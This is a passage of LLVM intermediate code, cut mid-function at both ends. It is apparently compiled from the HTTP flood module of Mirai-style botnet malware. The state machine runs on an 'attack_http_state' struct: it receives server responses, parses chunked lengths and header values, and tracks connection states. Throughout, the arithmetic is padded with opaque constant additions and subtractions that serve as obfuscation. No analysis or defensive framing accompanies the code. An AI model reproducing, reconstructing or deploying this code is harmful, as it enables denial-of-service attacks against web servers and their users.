  %2371 = call signext i8 @util_strcmp(i8* %2370, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %2372 = sext i8 %2371 to i32
  %2373 = icmp ne i32 %2372, 0
  br i1 %2373, label %2381, label %2374

; <label>:2374:                                   ; preds = %2364
  %2375 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2376 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2375, i32 0, i32 9
  %2377 = getelementptr inbounds [9 x i8], [9 x i8]* %2376, i32 0, i32 0
  %2378 = call signext i8 @util_strcmp(i8* %2377, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %2379 = sext i8 %2378 to i32
  %2380 = icmp ne i32 %2379, 0
  br i1 %2380, label %2381, label %2384

; <label>:2381:                                   ; preds = %2374, %2364
  %2382 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2383 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2382, i32 0, i32 1
  store i8 7, i8* %2383, align 4
  br label %2395

; <label>:2384:                                   ; preds = %2374
  %2385 = load i32, i32* %12, align 4
  %2386 = load i32, i32* %37, align 4
  %2387 = icmp sgt i32 %2385, %2386
  br i1 %2387, label %2388, label %2391

; <label>:2388:                                   ; preds = %2384
  %2389 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2390 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2389, i32 0, i32 1
  store i8 10, i8* %2390, align 4
  br label %2394

; <label>:2391:                                   ; preds = %2384
  %2392 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2393 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2392, i32 0, i32 1
  store i8 1, i8* %2393, align 4
  br label %2394

; <label>:2394:                                   ; preds = %2391, %2388
  br label %2395

; <label>:2395:                                   ; preds = %2394, %2381
  %2396 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2396, i32 0, i32 0
  %2398 = load i32, i32* %2397, align 4
  %2399 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2400 = load i32, i32* %37, align 4
  %2401 = sext i32 %2400 to i64
  %2402 = call i64 @recv(i32 %2398, i8* %2399, i64 %2401, i32 16384)
  %2403 = trunc i64 %2402 to i32
  store i32 %2403, i32* %12, align 4
  br label %2886

; <label>:2404:                                   ; preds = %1249
  %2405 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2406 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2405, i32 0, i32 1
  %2407 = load i8, i8* %2406, align 4
  %2408 = zext i8 %2407 to i32
  %2409 = icmp eq i32 %2408, 7
  br i1 %2409, label %2410, label %2833

; <label>:2410:                                   ; preds = %2404
  br label %2411

; <label>:2411:                                   ; preds = %2831, %2410
  %2412 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2413 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2412, i32 0, i32 1
  %2414 = load i8, i8* %2413, align 4
  %2415 = zext i8 %2414 to i32
  %2416 = icmp ne i32 %2415, 7
  br i1 %2416, label %2417, label %2418

; <label>:2417:                                   ; preds = %2411
  br label %2832

; <label>:2418:                                   ; preds = %2411
  %2419 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2420 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2419, i32 0, i32 17
  %2421 = load i32, i32* %2420, align 4
  %2422 = icmp eq i32 %2421, 1024
  br i1 %2422, label %2423, label %2437

; <label>:2423:                                   ; preds = %2418
  %2424 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2425 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2424, i32 0, i32 18
  %2426 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2425, i32 0, i32 0
  %2427 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2428 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2427, i32 0, i32 18
  %2429 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2428, i32 0, i32 0
  %2430 = getelementptr inbounds i8, i8* %2429, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2426, i8* %2430, i64 960, i32 1, i1 false)
  %2431 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2431, i32 0, i32 17
  %2433 = load i32, i32* %2432, align 4
  %2434 = sub i32 0, 64
  %2435 = add i32 %2433, %2434
  %2436 = sub nsw i32 %2433, 64
  store i32 %2435, i32* %2432, align 4
  br label %2437

; <label>:2437:                                   ; preds = %2423, %2418
  %2438 = call i32* @__errno_location() #7
  store i32 0, i32* %2438, align 4
  %2439 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2440 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2439, i32 0, i32 0
  %2441 = load i32, i32* %2440, align 4
  %2442 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2443 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2442, i32 0, i32 18
  %2444 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2443, i32 0, i32 0
  %2445 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2446 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2445, i32 0, i32 17
  %2447 = load i32, i32* %2446, align 4
  %2448 = sext i32 %2447 to i64
  %2449 = getelementptr inbounds i8, i8* %2444, i64 %2448
  %2450 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2450, i32 0, i32 17
  %2452 = load i32, i32* %2451, align 4
  %2453 = sub i32 0, %2452
  %2454 = add i32 1024, %2453
  %2455 = sub nsw i32 1024, %2452
  %2456 = sext i32 %2454 to i64
  %2457 = call i64 @recv(i32 %2441, i8* %2449, i64 %2456, i32 16384)
  %2458 = trunc i64 %2457 to i32
  store i32 %2458, i32* %12, align 4
  %2459 = load i32, i32* %12, align 4
  %2460 = icmp eq i32 %2459, 0
  br i1 %2460, label %2461, label %2463

; <label>:2461:                                   ; preds = %2437
  %2462 = call i32* @__errno_location() #7
  store i32 104, i32* %2462, align 4
  store i32 -1, i32* %12, align 4
  br label %2463

; <label>:2463:                                   ; preds = %2461, %2437
  %2464 = load i32, i32* %12, align 4
  %2465 = icmp eq i32 %2464, -1
  br i1 %2465, label %2466, label %2484

; <label>:2466:                                   ; preds = %2463
  %2467 = call i32* @__errno_location() #7
  %2468 = load i32, i32* %2467, align 4
  %2469 = icmp ne i32 %2468, 11
  br i1 %2469, label %2470, label %2483

; <label>:2470:                                   ; preds = %2466
  %2471 = call i32* @__errno_location() #7
  %2472 = load i32, i32* %2471, align 4
  %2473 = icmp ne i32 %2472, 11
  br i1 %2473, label %2474, label %2483

; <label>:2474:                                   ; preds = %2470
  %2475 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2476 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2475, i32 0, i32 0
  %2477 = load i32, i32* %2476, align 4
  %2478 = call i32 @close(i32 %2477)
  %2479 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2480 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2479, i32 0, i32 0
  store i32 -1, i32* %2480, align 4
  %2481 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2482 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2481, i32 0, i32 1
  store i8 0, i8* %2482, align 4
  br label %2483

; <label>:2483:                                   ; preds = %2474, %2470, %2466
  br label %2832

; <label>:2484:                                   ; preds = %2463
  %2485 = load i32, i32* %12, align 4
  %2486 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2487 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2486, i32 0, i32 17
  %2488 = load i32, i32* %2487, align 4
  %2489 = sub i32 %2488, -1279379216
  %2490 = add i32 %2489, %2485
  %2491 = add i32 %2490, -1279379216
  %2492 = add nsw i32 %2488, %2485
  store i32 %2491, i32* %2487, align 4
  %2493 = load i32, i32* %27, align 4
  %2494 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2495 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2494, i32 0, i32 2
  store i32 %2493, i32* %2495, align 4
  br label %2496

; <label>:2496:                                   ; preds = %2830, %2484
  store i32 0, i32* %59, align 4
  %2497 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2498 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2497, i32 0, i32 14
  %2499 = load i32, i32* %2498, align 4
  %2500 = icmp sgt i32 %2499, 0
  br i1 %2500, label %2501, label %2701

; <label>:2501:                                   ; preds = %2496
  %2502 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2503 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2502, i32 0, i32 14
  %2504 = load i32, i32* %2503, align 4
  %2505 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2506 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2505, i32 0, i32 17
  %2507 = load i32, i32* %2506, align 4
  %2508 = icmp sgt i32 %2504, %2507
  br i1 %2508, label %2509, label %2513

; <label>:2509:                                   ; preds = %2501
  %2510 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2511 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2510, i32 0, i32 17
  %2512 = load i32, i32* %2511, align 4
  br label %2517

; <label>:2513:                                   ; preds = %2501
  %2514 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2515 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2514, i32 0, i32 14
  %2516 = load i32, i32* %2515, align 4
  br label %2517

; <label>:2517:                                   ; preds = %2513, %2509
  %2518 = phi i32 [ %2512, %2509 ], [ %2516, %2513 ]
  store i32 %2518, i32* %59, align 4
  %2519 = load i32, i32* %59, align 4
  %2520 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2521 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2520, i32 0, i32 14
  %2522 = load i32, i32* %2521, align 4
  %2523 = add i32 %2522, 658999191
  %2524 = sub i32 %2523, %2519
  %2525 = sub i32 %2524, 658999191
  %2526 = sub nsw i32 %2522, %2519
  store i32 %2525, i32* %2521, align 4
  %2527 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2528 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2527, i32 0, i32 11
  %2529 = load i32, i32* %2528, align 4
  %2530 = icmp eq i32 %2529, 1
  br i1 %2530, label %2531, label %2700

; <label>:2531:                                   ; preds = %2517
  %2532 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2533 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2532, i32 0, i32 18
  %2534 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2533, i32 0, i32 0
  %2535 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2535, i32 0, i32 17
  %2537 = load i32, i32* %2536, align 4
  %2538 = call i8* @table_retrieve_val(i32 61, i32* null)
  %2539 = call i32 @util_memsearch(i8* %2534, i32 %2537, i8* %2538, i32 11)
  %2540 = icmp ne i32 %2539, -1
  br i1 %2540, label %2541, label %2699

; <label>:2541:                                   ; preds = %2531
  %2542 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2543 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2542, i32 0, i32 18
  %2544 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2543, i32 0, i32 0
  %2545 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2546 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2545, i32 0, i32 17
  %2547 = load i32, i32* %2546, align 4
  %2548 = call i8* @table_retrieve_val(i32 61, i32* null)
  %2549 = call i32 @util_memsearch(i8* %2544, i32 %2547, i8* %2548, i32 11)
  store i32 %2549, i32* %60, align 4
  %2550 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2551 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2550, i32 0, i32 18
  %2552 = load i32, i32* %60, align 4
  %2553 = sext i32 %2552 to i64
  %2554 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2551, i64 0, i64 %2553
  %2555 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2556 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2555, i32 0, i32 17
  %2557 = load i32, i32* %2556, align 4
  %2558 = load i32, i32* %60, align 4
  %2559 = add i32 %2557, -298097631
  %2560 = sub i32 %2559, %2558
  %2561 = sub i32 %2560, -298097631
  %2562 = sub nsw i32 %2557, %2558
  %2563 = call i32 @util_memsearch(i8* %2554, i32 %2561, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2563, i32* %61, align 4
  %2564 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2565 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2564, i32 0, i32 18
  %2566 = load i32, i32* %60, align 4
  %2567 = load i32, i32* %61, align 4
  %2568 = add i32 %2567, -1903742441
  %2569 = sub i32 %2568, 1
  %2570 = sub i32 %2569, -1903742441
  %2571 = sub nsw i32 %2567, 1
  %2572 = sub i32 0, %2566
  %2573 = sub i32 0, %2570
  %2574 = add i32 %2572, %2573
  %2575 = sub i32 0, %2574
  %2576 = add nsw i32 %2566, %2570
  %2577 = sext i32 %2575 to i64
  %2578 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2565, i64 0, i64 %2577
  store i8 0, i8* %2578, align 1
  %2579 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2580 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2579, i32 0, i32 15
  %2581 = load i32, i32* %2580, align 4
  %2582 = icmp slt i32 %2581, 5
  br i1 %2582, label %2583, label %2694

; <label>:2583:                                   ; preds = %2541
  %2584 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2585 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2584, i32 0, i32 18
  %2586 = load i32, i32* %60, align 4
  %2587 = sext i32 %2586 to i64
  %2588 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2585, i64 0, i64 %2587
  %2589 = call i32 @util_strlen(i8* %2588)
  %2590 = icmp slt i32 %2589, 128
  br i1 %2590, label %2591, label %2694

; <label>:2591:                                   ; preds = %2583
  %2592 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2593 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2592, i32 0, i32 16
  %2594 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2595 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2594, i32 0, i32 15
  %2596 = load i32, i32* %2595, align 4
  %2597 = sext i32 %2596 to i64
  %2598 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2593, i64 0, i64 %2597
  %2599 = getelementptr inbounds [128 x i8], [128 x i8]* %2598, i32 0, i32 0
  %2600 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2601 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2600, i32 0, i32 18
  %2602 = load i32, i32* %60, align 4
  %2603 = sext i32 %2602 to i64
  %2604 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2601, i64 0, i64 %2603
  %2605 = call i32 @util_strcpy(i8* %2599, i8* %2604)
  %2606 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2607 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2606, i32 0, i32 16
  %2608 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2609 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2608, i32 0, i32 15
  %2610 = load i32, i32* %2609, align 4
  %2611 = sext i32 %2610 to i64
  %2612 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2607, i64 0, i64 %2611
  %2613 = getelementptr inbounds [128 x i8], [128 x i8]* %2612, i32 0, i32 0
  %2614 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2615 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2614, i32 0, i32 16
  %2616 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2617 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2616, i32 0, i32 15
  %2618 = load i32, i32* %2617, align 4
  %2619 = sext i32 %2618 to i64
  %2620 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2615, i64 0, i64 %2619
  %2621 = getelementptr inbounds [128 x i8], [128 x i8]* %2620, i32 0, i32 0
  %2622 = call i32 @util_strlen(i8* %2621)
  %2623 = sext i32 %2622 to i64
  %2624 = getelementptr inbounds i8, i8* %2613, i64 %2623
  %2625 = call i32 @util_strcpy(i8* %2624, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %2626 = load i32, i32* %61, align 4
  %2627 = sub i32 0, 3
  %2628 = sub i32 %2626, %2627
  %2629 = add nsw i32 %2626, 3
  %2630 = load i32, i32* %60, align 4
  %2631 = sub i32 %2630, -1579703744
  %2632 = add i32 %2631, %2628
  %2633 = add i32 %2632, -1579703744
  %2634 = add nsw i32 %2630, %2628
  store i32 %2633, i32* %60, align 4
  %2635 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2636 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2635, i32 0, i32 18
  %2637 = load i32, i32* %60, align 4
  %2638 = sext i32 %2637 to i64
  %2639 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2636, i64 0, i64 %2638
  %2640 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2641 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2640, i32 0, i32 17
  %2642 = load i32, i32* %2641, align 4
  %2643 = load i32, i32* %60, align 4
  %2644 = sub i32 0, %2643
  %2645 = add i32 %2642, %2644
  %2646 = sub nsw i32 %2642, %2643
  %2647 = call i32 @util_memsearch(i8* %2639, i32 %2645, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2647, i32* %61, align 4
  %2648 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2649 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2648, i32 0, i32 18
  %2650 = load i32, i32* %60, align 4
  %2651 = load i32, i32* %61, align 4
  %2652 = sub i32 %2651, -455903889
  %2653 = sub i32 %2652, 1
  %2654 = add i32 %2653, -455903889
  %2655 = sub nsw i32 %2651, 1
  %2656 = sub i32 %2650, 660341
  %2657 = add i32 %2656, %2654
  %2658 = add i32 %2657, 660341
  %2659 = add nsw i32 %2650, %2654
  %2660 = sext i32 %2658 to i64
  %2661 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2649, i64 0, i64 %2660
  store i8 0, i8* %2661, align 1
  %2662 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2663 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2662, i32 0, i32 16
  %2664 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2665 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2664, i32 0, i32 15
  %2666 = load i32, i32* %2665, align 4
  %2667 = sext i32 %2666 to i64
  %2668 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2663, i64 0, i64 %2667
  %2669 = getelementptr inbounds [128 x i8], [128 x i8]* %2668, i32 0, i32 0
  %2670 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2671 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2670, i32 0, i32 16
  %2672 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2673 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2672, i32 0, i32 15
  %2674 = load i32, i32* %2673, align 4
  %2675 = sext i32 %2674 to i64
  %2676 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2671, i64 0, i64 %2675
  %2677 = getelementptr inbounds [128 x i8], [128 x i8]* %2676, i32 0, i32 0
  %2678 = call i32 @util_strlen(i8* %2677)
  %2679 = sext i32 %2678 to i64
  %2680 = getelementptr inbounds i8, i8* %2669, i64 %2679
  %2681 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2682 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2681, i32 0, i32 18
  %2683 = load i32, i32* %60, align 4
  %2684 = sext i32 %2683 to i64
  %2685 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2682, i64 0, i64 %2684
  %2686 = call i32 @util_strcpy(i8* %2680, i8* %2685)
  %2687 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2688 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2687, i32 0, i32 15
  %2689 = load i32, i32* %2688, align 4
  %2690 = sub i32 %2689, -562625932
  %2691 = add i32 %2690, 1
  %2692 = add i32 %2691, -562625932
  %2693 = add nsw i32 %2689, 1
  store i32 %2692, i32* %2688, align 4
  br label %2694

; <label>:2694:                                   ; preds = %2591, %2583, %2541
  %2695 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2696 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2695, i32 0, i32 14
  store i32 -1, i32* %2696, align 4
  %2697 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2698 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2697, i32 0, i32 1
  store i8 10, i8* %2698, align 4
  br label %2831

; <label>:2699:                                   ; preds = %2531
  br label %2700

; <label>:2700:                                   ; preds = %2699, %2517
  br label %2701

; <label>:2701:                                   ; preds = %2700, %2496
  %2702 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2703 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2702, i32 0, i32 14
  %2704 = load i32, i32* %2703, align 4
  %2705 = icmp eq i32 %2704, 0
  br i1 %2705, label %2706, label %2792

; <label>:2706:                                   ; preds = %2701
  %2707 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2708 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2707, i32 0, i32 13
  %2709 = load i32, i32* %2708, align 4
  %2710 = icmp eq i32 %2709, 1
  br i1 %2710, label %2711, label %2772

; <label>:2711:                                   ; preds = %2706
  %2712 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2713 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2712, i32 0, i32 18
  %2714 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2713, i32 0, i32 0
  %2715 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2716 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2715, i32 0, i32 17
  %2717 = load i32, i32* %2716, align 4
  %2718 = call i32 @util_memsearch(i8* %2714, i32 %2717, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %2719 = icmp ne i32 %2718, -1
  br i1 %2719, label %2720, label %2771

; <label>:2720:                                   ; preds = %2711
  %2721 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2722 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2721, i32 0, i32 18
  %2723 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2722, i32 0, i32 0
  %2724 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2725 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2724, i32 0, i32 17
  %2726 = load i32, i32* %2725, align 4
  %2727 = call i32 @util_memsearch(i8* %2723, i32 %2726, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2727, i32* %62, align 4
  %2728 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2729 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2728, i32 0, i32 18
  %2730 = load i32, i32* %62, align 4
  %2731 = sub i32 %2730, -11399688
  %2732 = sub i32 %2731, 2
  %2733 = add i32 %2732, -11399688
  %2734 = sub nsw i32 %2730, 2
  %2735 = sext i32 %2733 to i64
  %2736 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2729, i64 0, i64 %2735
  store i8 0, i8* %2736, align 1
  %2737 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2738 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2737, i32 0, i32 18
  %2739 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2738, i32 0, i32 0
  %2740 = load i32, i32* %62, align 4
  %2741 = call i32 @util_memsearch(i8* %2739, i32 %2740, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2742 = icmp ne i32 %2741, -1
  br i1 %2742, label %2743, label %2753

; <label>:2743:                                   ; preds = %2720
  %2744 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2745 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2744, i32 0, i32 18
  %2746 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2747 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2746, i32 0, i32 18
  %2748 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2747, i32 0, i32 0
  %2749 = load i32, i32* %62, align 4
  %2750 = call i32 @util_memsearch(i8* %2748, i32 %2749, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2751 = sext i32 %2750 to i64
  %2752 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2745, i64 0, i64 %2751
  store i8 0, i8* %2752, align 1
  br label %2753

; <label>:2753:                                   ; preds = %2743, %2720
  %2754 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2755 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2754, i32 0, i32 18
  %2756 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2755, i32 0, i32 0
  %2757 = call i32 @util_atoi(i8* %2756, i32 16)
  store i32 %2757, i32* %63, align 4
  %2758 = load i32, i32* %63, align 4
  %2759 = icmp eq i32 %2758, 0
  br i1 %2759, label %2760, label %2763

; <label>:2760:                                   ; preds = %2753
  %2761 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2762 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2761, i32 0, i32 1
  store i8 1, i8* %2762, align 4
  br label %2831

; <label>:2763:                                   ; preds = %2753
  %2764 = load i32, i32* %63, align 4
  %2765 = sub i32 0, 2
  %2766 = sub i32 %2764, %2765
  %2767 = add nsw i32 %2764, 2
  %2768 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2769 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2768, i32 0, i32 14
  store i32 %2766, i32* %2769, align 4
  %2770 = load i32, i32* %62, align 4
  store i32 %2770, i32* %59, align 4
  br label %2771

; <label>:2771:                                   ; preds = %2763, %2711
  br label %2791

; <label>:2772:                                   ; preds = %2706
  %2773 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2774 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2773, i32 0, i32 17
  %2775 = load i32, i32* %2774, align 4
  %2776 = load i32, i32* %59, align 4
  %2777 = sub i32 %2775, 232804071
  %2778 = sub i32 %2777, %2776
  %2779 = add i32 %2778, 232804071
  %2780 = sub nsw i32 %2775, %2776
  %2781 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2782 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2781, i32 0, i32 14
  store i32 %2779, i32* %2782, align 4
  %2783 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2784 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2783, i32 0, i32 14
  %2785 = load i32, i32* %2784, align 4
  %2786 = icmp eq i32 %2785, 0
  br i1 %2786, label %2787, label %2790

; <label>:2787:                                   ; preds = %2772
  %2788 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2789 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2788, i32 0, i32 1
  store i8 1, i8* %2789, align 4
  br label %2831

; <label>:2790:                                   ; preds = %2772
  br label %2791

; <label>:2791:                                   ; preds = %2790, %2771
  br label %2792

; <label>:2792:                                   ; preds = %2791, %2701
  %2793 = load i32, i32* %59, align 4
  %2794 = icmp eq i32 %2793, 0
  br i1 %2794, label %2795, label %2796

; <label>:2795:                                   ; preds = %2792
  br label %2831

; <label>:2796:                                   ; preds = %2792
  %2797 = load i32, i32* %59, align 4
  %2798 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
